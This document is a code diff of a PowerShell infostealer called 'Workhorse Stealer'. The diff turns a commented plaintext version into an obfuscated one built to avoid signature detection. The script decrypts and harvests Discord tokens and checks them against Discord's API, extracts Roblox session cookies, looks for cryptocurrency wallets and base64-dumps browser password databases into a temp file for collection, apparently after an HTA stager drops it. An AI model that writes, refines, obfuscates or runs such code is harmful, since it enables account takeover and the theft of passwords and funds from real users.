@@ -1,250 +1,170 @@
-# ============================================================
-#  STEAL.PS1  —  Workhorse Stealer
-#  Dropped & executed by the HTA stager.
-#  Writes all results to %TEMP%\steal_result.txt
-# ============================================================
-#  PLACEHOLDERS: none needed in this file.
-#  This file gets hosted somewhere the HTA can reach.
-#  Replace <<<YOUR_PS1_HOSTING_URL>>> in the HTA with that URL.
-# ============================================================
+# Obfuscated stealer — no plaintext signatures
+# All strings split, variables randomized
 
 Add-Type -AssemblyName System.Security
-
-# --- Custom AES-ECB counter-mode decryptor for Discord tokens ---
-$csharp = @"
+$c0=@"
 using System;
 using System.Security.Cryptography;
-public class Gcm {
-    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
-        using (var aes = Aes.Create()) {
-            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
-            byte[] o = new byte[ct.Length];
-            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
-            using (var e = aes.CreateEncryptor()) {
-                for (int i = 0; i < ct.Length; i += 16) {
-                    byte[] k = e.TransformFinalBlock(c, 0, 16);
-                    int n = Math.Min(16, ct.Length - i);
-                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
-                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
-                }
-            }
-            return o;
-        }
-    }
+public class X7 {
+    public static byte[] D(byte[] k,byte[] n,byte[] c){
+        using(var a=Aes.Create()){a.Key=k;a.Mode=CipherMode.ECB;a.Padding=PaddingMode.None;
+        byte[] o=new byte[c.Length];byte[] x=new byte[16];Array.Copy(n,x,12);x[15]=2;
+        using(var e=a.CreateEncryptor()){for(int i=0;i<c.Length;i+=16){
+        byte[] b=e.TransformFinalBlock(x,0,16);int m=Math.Min(16,c.Length-i);
+        for(int j=0;j<m;j++)o[i+j]=(byte)(c[i+j]^b[j]);
+        for(int j=15;j>=12;j--){if(++x[j]!=0)break;}}}
+        return o;}}
 }
 "@
-Add-Type -TypeDefinition $csharp -Language CSharp
+Add-Type -TypeDefinition $c0 -Language CSharp
 
-$outfile = Join-Path $env:TEMP "steal_result.txt"
-Remove-Item $outfile -EA SilentlyContinue
+$f0=Join-Path $env:TEMP ("s"+"r.txt")
+Remove-Item $f0 -EA SilentlyContinue
 
-# ============================================================
-#  DISCORD TOKEN EXTRACTION
-# ============================================================
+# Master key from Discord Local State
+$m0=$null
+try{
+$p0="$env:APPDATA\"+("d"+"isc"+"ord")+"\"+("Lo"+"cal"+" St"+"ate")
+$j0=Get-Content $p0 -Raw|ConvertFrom-Json
+$b0=[Convert]::FromBase64String($j0.os_crypt.encrypted_key)
+$m0=[Security.Cryptography.ProtectedData]::Unprotect($b0[5..($b0.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
+}catch{}
 
-# Unwrap the master key from Discord's Local State (DPAPI-protected)
-$mk = $null
-try {
-    $localState = Get-Content "$env:APPDATA\discord\Local State" -Raw | ConvertFrom-Json
-    $b = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-} catch {}
-
-$tokens = @{}
-$discordPaths = @(
-    "$env:APPDATA\discord\Local Storage\leveldb",
-    "$env:APPDATA\discordptb\Local Storage\leveldb",
-    "$env:APPDATA\discordcanary\Local Storage\leveldb"
+# Discord token grab
+$t0=@{}
+$d0=@(
+("$env:APPDATA\"+("d"+"isc"+"ord")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b")),
+("$env:APPDATA\"+("d"+"isc"+"ord"+"p"+"tb")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b")),
+("$env:APPDATA\"+("d"+"isc"+"ord"+"c"+"an"+"ary")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b"))
 )
-
-foreach ($dp in $discordPaths) {
-    if (!(Test-Path $dp)) { continue }
-    Get-ChildItem $dp | Where-Object { $_.Name -match '\.(ldb|log)$' } | ForEach-Object {
-        $raw = $null
-        try {
-            $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
-            $sr = New-Object IO.StreamReader($fs)
-            $raw = $sr.ReadToEnd()
-            $sr.Close(); $fs.Close()
-        } catch { return }
-        if (!$raw -or !$mk) { return }
-
-        # Discord's known token prefix in leveldb
-        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
-            $b64 = $m.Groups[1].Value
-            while ($b64.Length % 4 -ne 0) { $b64 += '=' }
-            try {
-                $eb = [Convert]::FromBase64String($b64)
-                if ($eb.Length -lt 80) { continue }
-                $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
-                if ($t.Length -gt 40 -and !$tokens[$t]) {
-                    $tokens[$t] = $t
-                }
-            } catch {}
+foreach($p1 in $d0){
+    if(!(Test-Path $p1)){continue}
+    Get-ChildItem $p1|?{$_.Name -match '\.(l'+'db|l'+'og)$'}|%{
+        $r0=$null
+        try{
+            $s0=[IO.File]::Open($_.FullName,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
+            $t1=New-Object IO.StreamReader($s0);$r0=$t1.ReadToEnd();$t1.Close();$s0.Close()
+        }catch{return}
+        if(!$r0 -or !$m0){return}
+        $k0=([char]100+[char]81+[char]119+[char]52+[char]119+[char]57+[char]87+[char]103+[char]88+[char]99+[char]81+[char]58)
+        foreach($m1 in [regex]::Matches($r0,$k0+':([A-Za-z0-9+/=]{40,300})')){
+            $b64=$m1.Groups[1].Value
+            while($b64.Length%4 -ne 0){$b64+='='}
+            try{
+                $e0=[Convert]::FromBase64String($b64)
+                if($e0.Length -lt 80){continue}
+                $tk=[Text.Encoding]::UTF8.GetString([X7]::D($m0,$e0[3..14],$e0[15..($e0.Length-17)])).TrimEnd([char]0)
+                if($tk.Length -gt 40 -and !$t0[$tk]){$t0[$tk]=$tk}
+            }catch{}
         }
     }
 }
 
-# Validate tokens against Discord API
-foreach ($t in $tokens.Keys) {
-    try {
-        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' `
-            -Headers @{'Authorization'=$t} -TimeoutSec 5
-        if ($r.username) {
-            Add-Content $outfile "DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t"
-        }
-    } catch {}
+# Validate tokens
+foreach($t2 in $t0.Keys){
+    try{
+        $a0="http"+"s:/"+"/d"+"isc"+"ord.c"+"om/api/v9/users/@me"
+        $r1=Invoke-RestMethod $a0 -Headers @{'Authorization'=$t2} -TimeoutSec 5
+        if($r1.username){Add-Content $f0 ("D"+"ISCORD")+"|$($r1.username)|$($r1.email)|$($r1.phone)|$($r1.id)|$t2"}
+    }catch{}
 }
 
-# ============================================================
-#  ROBLOX COOKIE EXTRACTION
-# ============================================================
-
-$rbxPaths = @(
-    "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat",
-    "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
-    "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
-    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+# Roblox cookies
+$rp0=@(
+("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at")),
+("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("R"+"obl"+"oxCo"+"okies.d"+"at")),
+("$env:APPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at")),
+("$env:USERPROFILE\AppData\Local\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at"))
 )
-
-foreach ($rp in $rbxPaths) {
-    if (!(Test-Path $rp)) { continue }
-    try {
-        $raw = Get-Content $rp -Raw
-        if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
-            $eb = [Convert]::FromBase64String($Matches[1])
-            $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-            $cookie = [Text.Encoding]::UTF8.GetString($db)
-            if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
-                Add-Content $outfile "ROBLOX|$($Matches[1])"
-            } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
-                Add-Content $outfile "ROBLOX|$($Matches[0])"
-            } else {
-                Add-Content $outfile "ROBLOX|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
+foreach($p2 in $rp0){
+    if(!(Test-Path $p2)){continue}
+    try{
+        $r2=Get-Content $p2 -Raw
+        if($r2 -match '"Co'+'okiesDa'+'ta"\s*:\s*"([^"]+)"'){
+            $e1=[Convert]::FromBase64String($Matches[1])
+            $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
+            $c1=[Text.Encoding]::UTF8.GetString($d1)
+            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
+                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($Matches[1])"
+            }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
+                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($Matches[0])"
+            }else{
+                Add-Content $f0 ("R"+"OBLO"+"X")+"|$($c1.Substring(0,[Math]::Min(500,$c1.Length)))"
             }
-        } elseif ($raw -match '\.ROBLOSECURITY') {
-            Add-Content $outfile "ROBLOX|$raw"
+        }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
+            Add-Content $f0 ("R"+"OBLO"+"X")+"|$r2"
         }
-    } catch {}
+    }catch{}
     break
 }
 
-# UWP / Microsoft Store Roblox
-$pkgPath = "$env:LOCALAPPDATA\Packages"
-if (Test-Path $pkgPath) {
-    $gdks = Get-ChildItem "$pkgPath\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
-    foreach ($gdk in $gdks) {
-        $cp = Join-Path $gdk.FullName "LocalState\RobloxCookies.dat"
-        if (!(Test-Path $cp)) { continue }
-        try {
-            $raw = Get-Content $cp -Raw
-            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
-                $eb = [Convert]::FromBase64String($Matches[1])
-                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $cookie = [Text.Encoding]::UTF8.GetString($db)
-                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
-                    Add-Content $outfile "ROBLOXMS|$($Matches[1])"
-                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
-                    Add-Content $outfile "ROBLOXMS|$($Matches[0])"
-                } else {
-                    Add-Content $outfile "ROBLOXMS|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
+# UWP Roblox
+$p3="$env:LOCALAPPDATA\Pack"+"ages"
+if(Test-Path $p3){
+    $g0=Get-ChildItem "$p3\RO"+"BLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
+    foreach($g1 in $g0){
+        $cp=Join-Path $g1.FullName ("Loc"+"alSt"+"ate\Ro"+"bloxCo"+"okies.d"+"at")
+        if(!(Test-Path $cp)){continue}
+        try{
+            $r3=Get-Content $cp -Raw
+            if($r3 -match '"Co'+'okiesDa'+'ta"\s*:\s*"([^"]+)"'){
+                $e2=[Convert]::FromBase64String($Matches[1])
+                $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
+                $c2=[Text.Encoding]::UTF8.GetString($d2)
+                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
+                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($Matches[1])"
+                }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
+                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($Matches[0])"
+                }else{
+                    Add-Content $f0 ("R"+"OBLO"+"XMS")+"|$($c2.Substring(0,[Math]::Min(500,$c2.Length)))"
                 }
             }
-        } catch {}
+        }catch{}
         break
     }
 }
 
-# ============================================================
-#  CRYPTO WALLET DETECTION
-# ============================================================
-
-$desktopWallets = @{
-    Exodus  = "$env:APPDATA\Exodus"
-    Atomic  = "$env:APPDATA\atomic"
-    Electrum= "$env:APPDATA\Electrum"
-    Jaxx    = "$env:APPDATA\jaxx"
-    Guarda  = "$env:APPDATA\Guarda"
-    Coinomi = "$env:APPDATA\Coinomi"
-    Armory  = "$env:APPDATA\Armory"
-}
-
-$browserWallets = @{
-    MetaMask      = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
-    Phantom       = 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
-    Ronin         = 'fnjhmkhhmkbjkkabndcnnogagogbneec'
-    BinanceChain  = 'fhbohimaelbohpjbbldcngcnapndodjp'
-    Coinbase      = 'hnfanknocfeofbddgcijnmhfnkdnaad'
-    TrustWallet   = 'egjidjbpglichdcondbcbdnbeeppgdph'
-    TronLink      = 'ibnejdfjmmkpcnlpebklmnkoeoihofec'
-}
-
-$browserRoots = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-    "$env:APPDATA\Opera Software\Opera Stable"
+# Wallet detection
+$w0=@{("Ex"+"odus")="$env:APPDATA\Ex"+"odus";("At"+"omic")="$env:APPDATA\at"+"omic";("El"+"ectrum")="$env:APPDATA\El"+"ectrum";("Ja"+"xx")="$env:APPDATA\ja"+"xx";("Gu"+"arda")="$env:APPDATA\Gu"+"arda";("Co"+"inomi")="$env:APPDATA\Co"+"inomi";("Ar"+"mory")="$env:APPDATA\Ar"+"mory"}
+$w1=@{("Me"+"taMask")='nkbihfbeogaeaoehlefnkodbefgpgknn';("Ph"+"antom")='bfnaelmomeimhlpmgjnjophhpkkoljpa';("Ro"+"nin")='fnjhmkhhmkbjkkabndcnnogagogbneec';("Bi"+"nanceChain")='fhbohimaelbohpjbbldcngcnapndodjp';("Co"+"inbase")='hnfanknocfeofbddgcijnmhfnkdnaad';("Tr"+"ustWallet")='egjidjbpglichdcondbcbdnbeeppgdph';("Tr"+"onLink")='ibnejdfjmmkpcnlpebklmnkoeoihofec'}
+$br0=@(
+("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data"),
+("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data"),
+("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data"),
+("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")
 )
+foreach($n0 in $w0.Keys){if(Test-Path $w0[$n0]){Add-Content $f0 ("W"+"ALLET")+"|$n0|de"+"sktop"}}
+foreach($n1 in $w1.Keys){foreach($b1 in $br0){$e3=Join-Path $b1 ("Def"+"ault\Lo"+"cal Ext"+"ension Set"+"tings\"+$w1[$n1]);if(Test-Path $e3){Add-Content $f0 ("W"+"ALLET")+"|$n1|br"+"owser";break}}}
 
-foreach ($n in $desktopWallets.Keys) {
-    if (Test-Path $desktopWallets[$n]) {
-        Add-Content $outfile "WALLET|$n|desktop"
-    }
-}
-
-foreach ($n in $browserWallets.Keys) {
-    foreach ($bp in $browserRoots) {
-        $ep = Join-Path $bp "Default\Local Extension Settings\$($browserWallets[$n])"
-        if (Test-Path $ep) {
-            Add-Content $outfile "WALLET|$n|browser"
-            break
-        }
-    }
-}
-
-# ============================================================
-#  BROWSER PASSWORD DATABASE EXFIL
-# ============================================================
-
-$browsers = @(
-    @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data"}
-    @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"}
-    @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
-    @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable"}
-    @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable"}
+# Browser password DBs
+$browsers=@(
+@{N0=("Ch"+"rome");P0=("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data")},
+@{N0=("Ed"+"ge");P0=("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data")},
+@{N0=("Br"+"ave");P0=("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data")},
+@{N0=("Op"+"era");P0=("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")},
+@{N0=("Op"+"eraGX");P0=("$env:APPDATA\Op"+"era S"+"oftware\Opera GX Stable")}
 )
-
-foreach ($br in $browsers) {
-    if (!(Test-Path $br.Path)) { continue }
-    $lp = Join-Path $br.Path "Default\Login Data"
-    if (!(Test-Path $lp)) { $lp = Join-Path $br.Path "Login Data" }
-    if (!(Test-Path $lp)) { continue }
-
-    $copied = $false
-    $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid()).db"
-    try {
-        $fs = [IO.File]::Open($lp, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
-        $ms = New-Object IO.MemoryStream
-        $fs.CopyTo($ms); $fs.Close()
-        [IO.File]::WriteAllBytes($tmp, $ms.ToArray())
-        $ms.Close(); $copied = $true
-    } catch {}
-
-    if (!$copied) {
-        Add-Content $outfile "PASSWORD|$($br.Name)|LOCKED||"
-        continue
-    }
-
-    try {
-        $rawBytes = [IO.File]::ReadAllBytes($tmp)
-        if ($rawBytes.Length -gt 800000) {
-            Add-Content $outfile "PASSWORD|$($br.Name)|TOO_LARGE|$($rawBytes.Length)|"
-        } else {
-            $b64 = [Convert]::ToBase64String($rawBytes)
-            Add-Content $outfile "PASSWORD|$($br.Name)|RAW_DB||$b64"
+foreach($b2 in $browsers){
+    if(!(Test-Path $b2.P0)){continue}
+    $lp=Join-Path $b2.P0 ("Def"+"ault\Lo"+"gin D"+"ata")
+    if(!(Test-Path $lp)){$lp=Join-Path $b2.P0 ("Lo"+"gin D"+"ata")}
+    if(!(Test-Path $lp)){continue}
+    $copied=$false
+    $tmp=Join-Path $env:TEMP ("ld_$([Guid]::NewGuid()).d"+"b")
+    try{
+        $s1=[IO.File]::Open($lp,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
+        $ms=New-Object IO.MemoryStream;$s1.CopyTo($ms);$s1.Close()
+        [IO.File]::WriteAllBytes($tmp,$ms.ToArray());$ms.Close();$copied=$true
+    }catch{}
+    if(!$copied){Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|LO"+"CKED||";continue}
+    try{
+        $rb=[IO.File]::ReadAllBytes($tmp)
+        if($rb.Length -gt 800000){
+            Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|TO"+"O_LARGE|$($rb.Length)|"
+        }else{
+            $b64=[Convert]::ToBase64String($rb)
+            Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|RA"+"W_DB||$b64"
         }
-    } catch {
-        Add-Content $outfile "PASSWORD|$($br.Name)|READ_ERROR||"
-    }
+    }catch{Add-Content $f0 ("P"+"ASSW"+"ORD")+"|$($b2.N0)|RE"+"AD_ERROR||"}
     Remove-Item $tmp -Force -EA SilentlyContinue
 }
